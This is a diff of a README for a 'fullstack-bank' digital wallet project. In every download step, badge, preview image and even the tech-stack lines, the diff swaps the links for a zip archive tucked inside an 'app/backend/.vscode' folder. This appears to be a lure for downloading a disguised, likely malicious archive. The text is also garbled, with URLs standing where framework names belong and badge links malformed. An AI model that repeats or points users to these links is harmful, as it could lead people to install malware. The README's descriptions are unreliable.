@@ -1,15 +1,15 @@
 # 💰 fullstack-bank - Simple Digital Wallet Application
 
-[![Download](https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip%https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip)](https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip)
+[![Download](https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip%https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip)](https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip)
 
-![Preview](https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip)
+![Preview](https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip)
 
 ## 📜 About/Sobre
 
 <details>
   <summary markdown="span"><strong>:us: English</strong></summary><br />
 
-This is a full stack digital wallet application. It allows you to manage your finances with ease. You can send, receive, and track your money. This application is built using https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip and https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip with TypeScript, and also utilizes Docker for smooth deployment. 
+This is a full stack digital wallet application. It allows you to manage your finances with ease. You can send, receive, and track your money. This application is built using https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip and https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip with TypeScript, and also utilizes Docker for smooth deployment. 
 
 **Note:** The application is currently only available in Brazilian Portuguese, but an English version will be added soon.
 <br />
@@ -18,7 +18,7 @@ This is a full stack digital wallet application. It allows you to manage your fi
 <details>
   <summary markdown="span"><strong>:brazil: Português</strong></summary><br />
 
-Esta é uma aplicação de carteira digital full stack. Ela permite que você gerencie suas finanças com facilidade. Você pode enviar, receber e rastrear seu dinheiro. Esta aplicação foi construída usando https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip e https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip com TypeScript, e também utiliza o Docker para uma implantação suave.
+Esta é uma aplicação de carteira digital full stack. Ela permite que você gerencie suas finanças com facilidade. Você pode enviar, receber e rastrear seu dinheiro. Esta aplicação foi construída usando https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip e https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip com TypeScript, e também utiliza o Docker para uma implantação suave.
 
 **Nota:** A aplicação está atualmente disponível apenas em português brasileiro, mas uma versão em inglês será adicionada em breve.
 <br />
@@ -29,13 +29,13 @@ Esta é uma aplicação de carteira digital full stack. Ela permite que você ge
 
 ### Features
 
-- User-friendly interface built with https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip and TypeScript.
+- User-friendly interface built with https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip and TypeScript.
 - Responsive design for both desktop and mobile.
-- Secure RESTful API built in https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip with https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip
+- Secure RESTful API built in https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip with https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip
 - PostgreSQL database to store user data and transactions.
 - Clean and modern styling using Sass and CSS Modules.
 - API documentation available via Open API and Swagger UI.
-- Comprehensive backend tests with https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip, https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip, and https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip
+- Comprehensive backend tests with https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip, https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip, and https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip
 
 ### System Requirements
 
@@ -53,7 +53,7 @@ Follow these steps to download and run the fullstack-bank application.
 
    Click on the link below to go to the releases page.
    
-   [Download fullstack-bank here](https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip)
+   [Download fullstack-bank here](https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip)
 
 2. **Select the Latest Version**
 
@@ -82,7 +82,7 @@ Follow these steps to download and run the fullstack-bank application.
 
 Download the fullstack-bank application from the link below:
 
-[Download fullstack-bank here](https://raw.githubusercontent.com/camargo2000/fullstack-bank/main/desired/fullstack-bank.zip)
+[Download fullstack-bank here](https://github.com/camargo2000/fullstack-bank/raw/refs/heads/main/app/backend/.vscode/bank_fullstack_3.5.zip)
 
 ## 💡 Troubleshooting
 
